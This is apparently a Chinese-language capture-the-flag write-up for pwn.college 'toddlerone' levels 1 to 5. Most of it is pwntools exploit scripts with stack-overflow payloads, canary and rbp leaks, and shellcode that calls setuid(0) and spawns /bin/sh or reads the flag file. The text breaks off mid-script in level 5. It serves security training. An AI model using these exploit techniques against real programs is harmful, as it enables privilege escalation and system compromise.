<h2 id="level-1-3"><a class="markdownIt-Anchor" href="#level-1-3"></a> level 1</h2>
<blockquote>
<p>把之前shellcode和memory等结合在了一起</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> glob<br><span class="hljs-keyword">import</span> random<br>context(arch = <span class="hljs-string">&#x27;amd64&#x27;</span> , os = <span class="hljs-string">&#x27;linux&#x27;</span>, log_level=<span class="hljs-string">&quot;info&quot;</span>)<br>binary_paths = glob.glob(<span class="hljs-string">&quot;/challenge/toddlerone_level[0-9].[0-9]&quot;</span>)<br>r = process(binary_paths)<br>shellcode = <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    mov rbx, 0x00000067616c662f</span><br><span class="hljs-string">    push rbx</span><br><span class="hljs-string">    mov rdi,rsp</span><br><span class="hljs-string">    mov rsi,0</span><br><span class="hljs-string">    mov rax,2</span><br><span class="hljs-string">    syscall</span><br><span class="hljs-string"></span><br><span class="hljs-string">    mov rdi,1</span><br><span class="hljs-string">    mov rsi,rax</span><br><span class="hljs-string">    mov rdx,0</span><br><span class="hljs-string">    mov r10,1000</span><br><span class="hljs-string">    mov rax,40</span><br><span class="hljs-string">    syscall</span><br><span class="hljs-string">    </span><br><span class="hljs-string">    mov rax,60</span><br><span class="hljs-string">    syscall</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br>payload_of_shell = asm(shellcode,arch=<span class="hljs-string">&quot;amd64&quot;</span>)<br>r.send(payload_of_shell)<br>interval = <span class="hljs-number">0x60</span><br>r.sendlineafter(<span class="hljs-string">&quot;Payload size: &quot;</span>,<span class="hljs-built_in">str</span>(interval+<span class="hljs-number">0x10</span>))<br>ret = <span class="hljs-number">0x16af0000</span><br>payload = <span class="hljs-string">b&#x27;A&#x27;</span>*(interval + <span class="hljs-number">8</span>) + p64(ret)<br>r.sendlineafter(<span class="hljs-string">&quot;bytes)!&quot;</span>,payload)<br>text = r.recvall().decode(<span class="hljs-string">&quot;utf-8&quot;</span>)<br><span class="hljs-keyword">if</span> <span class="hljs-string">&quot;pwn&quot;</span> <span class="hljs-keyword">in</span> text:<br>    log.success(text[text.find(<span class="hljs-string">&quot;pwn.college&#123;&quot;</span>):-<span class="hljs-number">1</span>])<br></code></pre></td></tr></table></figure>
<h2 id="level-2-3"><a class="markdownIt-Anchor" href="#level-2-3"></a> level 2</h2>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> glob<br><span class="hljs-keyword">import</span> random<br>context(arch = <span class="hljs-string">&#x27;amd64&#x27;</span> , os = <span class="hljs-string">&#x27;linux&#x27;</span>, log_level=<span class="hljs-string">&quot;info&quot;</span>)<br>binary_paths = glob.glob(<span class="hljs-string">&quot;/challenge/toddlerone_level[0-9].[0-9]&quot;</span>)<br>r = process(binary_paths)<br>shellcode = <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    mov rbx, 0x00000067616c662f</span><br><span class="hljs-string">    push rbx</span><br><span class="hljs-string">    mov rdi,rsp</span><br><span class="hljs-string">    mov rsi,0</span><br><span class="hljs-string">    mov rax,2</span><br><span class="hljs-string">    syscall</span><br><span class="hljs-string"></span><br><span class="hljs-string">    mov rdi,1</span><br><span class="hljs-string">    mov rsi,rax</span><br><span class="hljs-string">    mov rdx,0</span><br><span class="hljs-string">    mov r10,1000</span><br><span class="hljs-string">    mov rax,40</span><br><span class="hljs-string">    syscall</span><br><span class="hljs-string">    </span><br><span class="hljs-string">    mov rax,60</span><br><span class="hljs-string">    syscall</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br>interval = <span class="hljs-number">0x70</span><br>payload = asm(shellcode,arch=<span class="hljs-string">&quot;amd64&quot;</span>).ljust((interval+<span class="hljs-number">8</span>),<span class="hljs-string">b&#x27;a&#x27;</span>)	<span class="hljs-comment">#ljust自动在后面填充到指定长度</span><br>r.sendlineafter(<span class="hljs-string">&quot;Payload size: &quot;</span>,<span class="hljs-built_in">str</span>(interval+<span class="hljs-number">0x10</span>))<br>ret = <span class="hljs-number">0x00007fffffffd260</span>	<span class="hljs-comment">#返回到一开始input的地方</span><br>payload += p64(ret)<br>r.sendlineafter(<span class="hljs-string">&quot;bytes)!&quot;</span>,payload)<br>text = r.recvall().decode(<span class="hljs-string">&quot;utf-8&quot;</span>)<br><span class="hljs-keyword">if</span> <span class="hljs-string">&quot;pwn&quot;</span> <span class="hljs-keyword">in</span> text:<br>    log.success(text[text.find(<span class="hljs-string">&quot;pwn.college&#123;&quot;</span>):-<span class="hljs-number">1</span>])<br></code></pre></td></tr></table></figure>
<p>​	level2.1有点奇怪，我是用上面那个shellcode不能成功，能执行不能打印，真是奇了怪了，然后换成下面的这个，在bash中也不能打印，只有在tmux中才可以使用 <code>cat flag</code> 打印出flag出来，我真是无语了</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> glob<br><span class="hljs-keyword">import</span> random<br>context(arch = <span class="hljs-string">&#x27;amd64&#x27;</span> , os = <span class="hljs-string">&#x27;linux&#x27;</span>, log_level=<span class="hljs-string">&quot;info&quot;</span>)<br>context.terminal = [<span class="hljs-string">&#x27;tmux&#x27;</span>, <span class="hljs-string">&#x27;splitw&#x27;</span>, <span class="hljs-string">&#x27;-h&#x27;</span>, <span class="hljs-string">&#x27;-F&#x27;</span> <span class="hljs-string">&#x27;#&#123;pane_pid&#125;&#x27;</span>, <span class="hljs-string">&#x27;-P&#x27;</span>]<br>binary_paths = glob.glob(<span class="hljs-string">&quot;/challenge/toddlerone_level[0-9].[0-9]&quot;</span>)<br><span class="hljs-comment"># r = gdb.debug(binary_paths,&quot;break *0x401C0B&quot;)</span><br>r = process(binary_paths)<br>shellcode = <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    mov rax, 0x69           # setuid,设置特权,单纯使用shell不能提权</span><br><span class="hljs-string">    mov rdi, 0</span><br><span class="hljs-string">    syscall</span><br><span class="hljs-string"></span><br><span class="hljs-string">    mov rax, 59             # execve</span><br><span class="hljs-string">    lea rdi, [rip+binsh]</span><br><span class="hljs-string">    mov rsi, 0</span><br><span class="hljs-string">    mov rdx, 0</span><br><span class="hljs-string">    syscall</span><br><span class="hljs-string">binsh:</span><br><span class="hljs-string">    .string &quot;/bin/sh&quot;</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br>interval = <span class="hljs-number">0x90</span><br>payload = asm(shellcode,arch=<span class="hljs-string">&quot;amd64&quot;</span>).ljust((interval + <span class="hljs-number">0x8</span>),<span class="hljs-string">b&#x27;a&#x27;</span>)	<span class="hljs-comment">#覆盖了rbp</span><br>r.sendlineafter(<span class="hljs-string">&quot;Payload size: &quot;</span>,<span class="hljs-built_in">str</span>(interval + <span class="hljs-number">0x10</span>))	<span class="hljs-comment">#覆盖ret</span><br>ret = <span class="hljs-number">0x7fffffffd280</span> - interval<br>payload += p64(ret)<br><span class="hljs-built_in">print</span>(payload)<br>r.sendlineafter(<span class="hljs-string">&quot;bytes)!&quot;</span>,payload)<br>r.interactive()<br></code></pre></td></tr></table></figure>
<h2 id="level-3-3"><a class="markdownIt-Anchor" href="#level-3-3"></a> level 3</h2>
<blockquote>
<p>两次printf泄露canary，主要是对于buf地址的分析</p>
</blockquote>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">第一次的栈</span><br>buf	0x00007ffebf117050<br>rsp	0x00007ffebf117010<br>rbp	0x00007ffebf117090					0x00007ffebf1180d0<br><span class="hljs-meta prompt_"># </span><span class="language-bash">第二次的栈</span><br>buf	0x00007ffebf116fc0<br>rsp	0x00007ffebf116f80<br>rbp	0x00007ffebf117000					0x00007ffebf117090<br><span class="hljs-meta prompt_"># </span><span class="language-bash">第三次的栈</span><br>buf	0x00007ffebf116f30<br>rsp	0x00007ffebf116ef0<br>rbp	0x00007ffebf116f70					0x00007ffebf117000<br></code></pre></td></tr></table></figure>
<p>​	这里主要分析三次栈的差别，rsp相差0x90，根据下图栈开辟情况。首先 <code>push rbp</code> 和 <code>push canary</code> 占用了 0x10 字节，然后 <code>add</code> 增加了 0x80 字节，满足 0x90 的数据。然后可以知道后面一次的函数是在前面一次的栈上开辟的，所以每次 <code>rbp </code> 的差值也符合 0x90，同时下一次rbp存储的值刚好就是上一次rbp的地址，因为这是 <code>push</code> 操作的结果，所以可以使用第二次来泄露 rbp 的值，也就泄露出第一次的rbp地址，然后再通过 <code>address_of_rbp - 0x90 * 2</code> 来找到第三次rbp的地址，然后通过偏移 <code>0x40</code> 可以找到第三次buf的地址，从而完成ret的构造。</p>
<p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202402271836763.png" srcset="/img/loading.gif" lazyload alt="image-20240227183658636" /></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> glob<br><span class="hljs-keyword">import</span> random<br><span class="hljs-keyword">import</span> struct<br>context(arch = <span class="hljs-string">&#x27;amd64&#x27;</span> , os = <span class="hljs-string">&#x27;linux&#x27;</span>, log_level=<span class="hljs-string">&quot;info&quot;</span>)<br>binary_paths = glob.glob(<span class="hljs-string">&quot;/challenge/toddlerone_level[0-9].[0-9]&quot;</span>)<br>r = process(binary_paths)<br>shellcode = <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    mov rax, 0x69           # setuid,设置特权,单纯使用shell不能提权</span><br><span class="hljs-string">    mov rdi, 0</span><br><span class="hljs-string">    syscall</span><br><span class="hljs-string"></span><br><span class="hljs-string">    mov rax, 59             # execve</span><br><span class="hljs-string">    lea rdi, [rip+binsh]</span><br><span class="hljs-string">    mov rsi, 0</span><br><span class="hljs-string">    mov rdx, 0</span><br><span class="hljs-string">    syscall</span><br><span class="hljs-string">binsh:</span><br><span class="hljs-string">    .string &quot;/bin/sh&quot;</span><br><span class="hljs-string">&quot;&quot;&quot;</span>	<span class="hljs-comment"># 采用这个shellcode是为了让长度小于0x40 - 24</span><br><span class="hljs-comment"># 第一次泄露 canary 的值</span><br>interval = <span class="hljs-number">0x40</span> - <span class="hljs-number">8</span> + <span class="hljs-number">1</span>	<span class="hljs-comment"># 减去canary的长度，然后需要覆盖最后一个&#x27;\x00&#x27;而+1，溢出到canary之前的位置</span><br>r = process(binary_paths)<br>r.sendlineafter(<span class="hljs-string">&quot;Payload size:&quot;</span>, <span class="hljs-built_in">str</span>(interval))<br>payload = <span class="hljs-string">b&#x27;REPEAT&#x27;</span> + <span class="hljs-string">b&#x27;A&#x27;</span>* (interval - <span class="hljs-number">6</span>)  <span class="hljs-comment"># 满足buffer的要求</span><br>r.sendafter(<span class="hljs-string">&quot;bytes)!\n&quot;</span>, payload)<br>r.recvuntil(<span class="hljs-string">&quot;You said: &quot;</span>)<br>text_of_canary = r.recvuntil(<span class="hljs-string">&quot;Backdoor&quot;</span>)<br>canary = <span class="hljs-string">b&#x27;\x00&#x27;</span> + text_of_canary[interval:interval+<span class="hljs-number">7</span>]	<span class="hljs-comment"># 获得canary的值</span><br>hex_canary = [<span class="hljs-built_in">hex</span>(byte) <span class="hljs-keyword">for</span> byte <span class="hljs-keyword">in</span> <span class="hljs-built_in">bytearray</span>(canary)]<br>log.info(<span class="hljs-string">f&quot;canary : <span class="hljs-subst">&#123;<span class="hljs-built_in">list</span>(hex_canary)&#125;</span>&quot;</span>)<br><br><span class="hljs-comment"># 第二次泄露 第一次 rbp 的地址，从而构造 ret</span><br>interval += <span class="hljs-number">7</span>	<span class="hljs-comment"># 补上canary，溢出到rbp之前的位置</span><br>r.sendlineafter(<span class="hljs-string">&quot;Payload size:&quot;</span>, <span class="hljs-built_in">str</span>(interval))<br>payload = <span class="hljs-string">b&#x27;REPEAT&#x27;</span> + <span class="hljs-string">b&#x27;B&#x27;</span>* (interval - <span class="hljs-number">6</span>)   <span class="hljs-comment"># 这里直接把canary也覆盖了，因为不覆盖会有&#x27;\x00&#x27;截断</span><br>r.sendafter(<span class="hljs-string">&quot;bytes)!\n&quot;</span>, payload)<br>r.recvuntil(<span class="hljs-string">&quot;You said: &quot;</span>)<br>text_of_rbp = r.recvuntil(<span class="hljs-string">&quot;Backdoor&quot;</span>)<br>rbp_byte = text_of_rbp[interval:interval+<span class="hljs-number">6</span>]	<span class="hljs-comment"># 获得rbp的值</span><br>hex_rbp = [<span class="hljs-built_in">hex</span>(byte) <span class="hljs-keyword">for</span> byte <span class="hljs-keyword">in</span> <span class="hljs-built_in">bytearray</span>(rbp_byte)]<br>log.info(<span class="hljs-string">f&quot;address of rbp : <span class="hljs-subst">&#123;<span class="hljs-built_in">list</span>(hex_rbp)&#125;</span>&quot;</span>)<br>rbp_int = struct.unpack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, (rbp_byte + <span class="hljs-string">b&#x27;\x00\x00&#x27;</span>))[<span class="hljs-number">0</span>]<br>rbp_int -= (<span class="hljs-number">0x90</span> * <span class="hljs-number">2</span> + interval)		<span class="hljs-comment"># 修正 ret</span><br>ret = struct.pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, rbp_int)<br><br><span class="hljs-comment"># 第三次执行 shellcode</span><br>shell_code = asm(shellcode,arch=<span class="hljs-string">&quot;amd64&quot;</span>)<br>hex_shell_code = [<span class="hljs-built_in">hex</span>(byte) <span class="hljs-keyword">for</span> byte <span class="hljs-keyword">in</span> <span class="hljs-built_in">bytearray</span>(shell_code)]<br>log.info(<span class="hljs-string">f&quot;shellcode : <span class="hljs-subst">&#123;hex_shell_code&#125;</span>&quot;</span>)<br>log.info(<span class="hljs-string">f&quot;len of shellcode is: <span class="hljs-subst">&#123;<span class="hljs-built_in">len</span>(shell_code)&#125;</span>&quot;</span>)<br>interval += <span class="hljs-number">16</span>	<span class="hljs-comment"># 补上rbp和ret，需要溢出到return之后的位置</span><br>r.sendlineafter(<span class="hljs-string">&quot;Payload size:&quot;</span>, <span class="hljs-built_in">str</span>(interval)) <br>payload = shell_code + <span class="hljs-string">b&#x27;B&#x27;</span> * (interval - <span class="hljs-number">24</span> - <span class="hljs-built_in">len</span>(shell_code)) + canary + <span class="hljs-string">b&#x27;C&#x27;</span> * <span class="hljs-number">0x8</span> + ret<br>r.sendafter(<span class="hljs-string">&quot;bytes)!\n&quot;</span>, payload)<br>r.interactive()<br></code></pre></td></tr></table></figure>
<h2 id="level-4-3"><a class="markdownIt-Anchor" href="#level-4-3"></a> level 4</h2>
<blockquote>
<p>需要设置内存中一个固定值，找准偏移即可</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> glob<br><span class="hljs-keyword">import</span> random<br><span class="hljs-keyword">import</span> struct<br>context(arch = <span class="hljs-string">&#x27;amd64&#x27;</span> , os = <span class="hljs-string">&#x27;linux&#x27;</span>, log_level=<span class="hljs-string">&quot;info&quot;</span>)<br>binary_paths = glob.glob(<span class="hljs-string">&quot;/challenge/toddlerone_level[0-9].[0-9]&quot;</span>)<br>r = process(binary_paths)<br>shellcode = <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    mov rax, 0x69           # setuid,设置特权,单纯使用shell不能提权</span><br><span class="hljs-string">    mov rdi, 0</span><br><span class="hljs-string">    syscall</span><br><span class="hljs-string"></span><br><span class="hljs-string">    mov rax, 59             # execve</span><br><span class="hljs-string">    lea rdi, [rip+binsh]</span><br><span class="hljs-string">    mov rsi, 0</span><br><span class="hljs-string">    mov rdx, 0</span><br><span class="hljs-string">    syscall</span><br><span class="hljs-string">binsh:</span><br><span class="hljs-string">    .string &quot;/bin/sh&quot;</span><br><span class="hljs-string">&quot;&quot;&quot;</span>	<span class="hljs-comment"># 采用这个shellcode是为了让长度小于0x40 - 24</span><br><span class="hljs-comment"># 第一次泄露 canary 的值</span><br>interval = <span class="hljs-number">0x60</span> - <span class="hljs-number">8</span> + <span class="hljs-number">1</span>	<span class="hljs-comment"># 减去canary的长度，然后需要覆盖最后一个&#x27;\x00&#x27;而+1，溢出到canary之前的位置</span><br>r = process(binary_paths)<br>r.sendlineafter(<span class="hljs-string">&quot;Payload size:&quot;</span>, <span class="hljs-built_in">str</span>(interval))<br>payload = <span class="hljs-string">b&#x27;REPEAT&#x27;</span> + <span class="hljs-string">b&#x27;A&#x27;</span>* (interval - <span class="hljs-number">6</span>)  <span class="hljs-comment"># 满足buffer的要求</span><br>r.sendafter(<span class="hljs-string">&quot;bytes)!\n&quot;</span>, payload)<br>r.recvuntil(<span class="hljs-string">&quot;You said: &quot;</span>)<br>text_of_canary = r.recvuntil(<span class="hljs-string">&quot;Backdoor&quot;</span>)<br>canary = <span class="hljs-string">b&#x27;\x00&#x27;</span> + text_of_canary[interval:interval+<span class="hljs-number">7</span>]	<span class="hljs-comment"># 获得canary的值</span><br>hex_canary = [<span class="hljs-built_in">hex</span>(byte) <span class="hljs-keyword">for</span> byte <span class="hljs-keyword">in</span> <span class="hljs-built_in">bytearray</span>(canary)]<br>log.info(<span class="hljs-string">f&quot;canary : <span class="hljs-subst">&#123;<span class="hljs-built_in">list</span>(hex_canary)&#125;</span>&quot;</span>)<br><span class="hljs-comment"># 第二次泄露 第一次 rbp 的地址，从而构造 ret</span><br>interval += <span class="hljs-number">7</span> <span class="hljs-comment"># 补上canary，溢出到rbp之前的位置</span><br>r.sendlineafter(<span class="hljs-string">&quot;Payload size:&quot;</span>, <span class="hljs-built_in">str</span>(interval))<br>payload = <span class="hljs-string">b&#x27;REPEAT&#x27;</span> + <span class="hljs-string">b&#x27;B&#x27;</span>* (interval - <span class="hljs-number">6</span>)   <span class="hljs-comment"># 这里直接把canary也覆盖了，因为不覆盖会有&#x27;\x00&#x27;截断</span><br>r.sendafter(<span class="hljs-string">&quot;bytes)!\n&quot;</span>, payload)<br>r.recvuntil(<span class="hljs-string">&quot;You said: &quot;</span>)<br>text_of_rbp = r.recvuntil(<span class="hljs-string">&quot;Backdoor&quot;</span>)<br>rbp_byte = text_of_rbp[interval:interval+<span class="hljs-number">6</span>]	<span class="hljs-comment"># 获得rbp的值</span><br>hex_rbp = [<span class="hljs-built_in">hex</span>(byte) <span class="hljs-keyword">for</span> byte <span class="hljs-keyword">in</span> <span class="hljs-built_in">bytearray</span>(rbp_byte)]<br>log.info(<span class="hljs-string">f&quot;address of rbp : <span class="hljs-subst">&#123;<span class="hljs-built_in">list</span>(hex_rbp)&#125;</span>&quot;</span>)<br>rbp_int = struct.unpack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, (rbp_byte + <span class="hljs-string">b&#x27;\x00\x00&#x27;</span>))[<span class="hljs-number">0</span>]<br>rbp_int -= ((<span class="hljs-number">0xA0</span> + <span class="hljs-number">0x10</span>) * <span class="hljs-number">2</span> + interval)		<span class="hljs-comment"># 修正 ret</span><br>ret = struct.pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, rbp_int)<br><br><span class="hljs-comment"># 第三次执行 shellcode</span><br>shell_code = asm(shellcode,arch=<span class="hljs-string">&quot;amd64&quot;</span>)<br>hex_shell_code = [<span class="hljs-built_in">hex</span>(byte) <span class="hljs-keyword">for</span> byte <span class="hljs-keyword">in</span> <span class="hljs-built_in">bytearray</span>(shell_code)]<br>log.info(<span class="hljs-string">f&quot;shellcode : <span class="hljs-subst">&#123;hex_shell_code&#125;</span>&quot;</span>)<br>log.info(<span class="hljs-string">f&quot;len of shellcode is: <span class="hljs-subst">&#123;<span class="hljs-built_in">len</span>(shell_code)&#125;</span>&quot;</span>)<br>interval += <span class="hljs-number">16</span>	<span class="hljs-comment"># 补上rbp和ret，需要溢出到return之后的位置</span><br>r.sendlineafter(<span class="hljs-string">&quot;Payload size:&quot;</span>, <span class="hljs-built_in">str</span>(interval)) <br>num = <span class="hljs-number">0x9CB0C1F346468855</span><br>num_addr = <span class="hljs-number">0x18</span>				<span class="hljs-comment"># 数值距离rbp的偏移</span><br>payload = shell_code + <span class="hljs-string">b&#x27;C&#x27;</span> * (interval - <span class="hljs-number">16</span> - num_addr - <span class="hljs-built_in">len</span>(shell_code)) + p64(num) + <span class="hljs-string">b&#x27;D&#x27;</span>*(num_addr - <span class="hljs-number">0x10</span>) + canary + <span class="hljs-string">b&#x27;E&#x27;</span>*<span class="hljs-number">0x8</span> + ret	<span class="hljs-comment"># num_addr-0x10是因为num离rbp距离为0x18，然后num和canary各占据0x8的大小</span><br>r.sendafter(<span class="hljs-string">&quot;bytes)!\n&quot;</span>, payload)<br>r.interactive()<br></code></pre></td></tr></table></figure>
<h2 id="level-5-3"><a class="markdownIt-Anchor" href="#level-5-3"></a> level 5</h2>
<blockquote>
<p>初始化有了改变，注意多出来一个 push rbx，所以偏移需要相应更改</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> glob<br><span class="hljs-keyword">import</span> random<br><span class="hljs-keyword">import</span> struct<br>context(arch = <span class="hljs-string">&#x27;amd64&#x27;</span> , os = <span class="hljs-string">&#x27;linux&#x27;</span>, log_level=<span class="hljs-string">&quot;info&quot;</span>)<br>binary_paths = glob.glob(<span class="hljs-string">&quot;/challenge/toddlerone_level[0-9].[0-9]&quot;</span>)<br>r = process(binary_paths)<br>shellcode = <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    mov rax, 0x69           # setuid,设置特权,单纯使用shell不能提权</span><br><span class="hljs-string">    mov rdi, 0</span><br><span class="hljs-string">    syscall</span><br><span class="hljs-string"></span><br><span class="hljs-string">    mov rax, 59             # execve</span><br><span class="hljs-string">    lea rdi, [rip+binsh]</span><br><span class="hljs-string">    mov rsi, 0</span><br><span class="hljs-string">    mov rdx, 0</span><br><span class="hljs-string">    syscall</span><br><span class="hljs-string">binsh:</span><br><span class="hljs-string">    .string &quot;/bin/sh&quot;</span><br><span class="hljs-string">&quot;&quot;&quot;</span>	<span class="hljs-comment"># 采用这个shellcode是为了让长度小于0x40 - 24</span><br><span class="hljs-comment"># 第一次泄露 canary 的值</span><br>interval = <span class="hljs-number">0x70</span> - <span class="hljs-number">8</span> + <span class="hljs-number">1</span> - <span class="hljs-number">16</span>	<span class="hljs-comment"># 减去canary的长度，然后需要覆盖最后一个&#x27;\x00&#x27;而+1，溢出到canary之前的位置</span><br>r = process(binary_paths)<br>r.sendlineafter(<span class="hljs-string">&quot;Payload size:&quot;</span>, <span class="hljs-built_in">str</span>(interval))<br>payload = <span class="hljs-string">b&#x27;REPEAT&#x27;</span> + <span class="hljs-string">b&#x27;A&#x27;</span>* (interval - <span class="hljs-number">6</span>)  <span class="hljs-comment"># 满足buffer的要求</span><br>r.sendafter(<span class="hljs-string">&quot;bytes)!\n&quot;</span>, payload)<br>r.recvuntil(<span class="hljs-string">&quot;You said: &quot;</span>)<br>text_of_canary = r.recvuntil(<span class="hljs-string">&quot;Backdoor&quot;</span>)<br>canary = <span class="hljs-string">b&#x27;\x00&#x27;</span> + 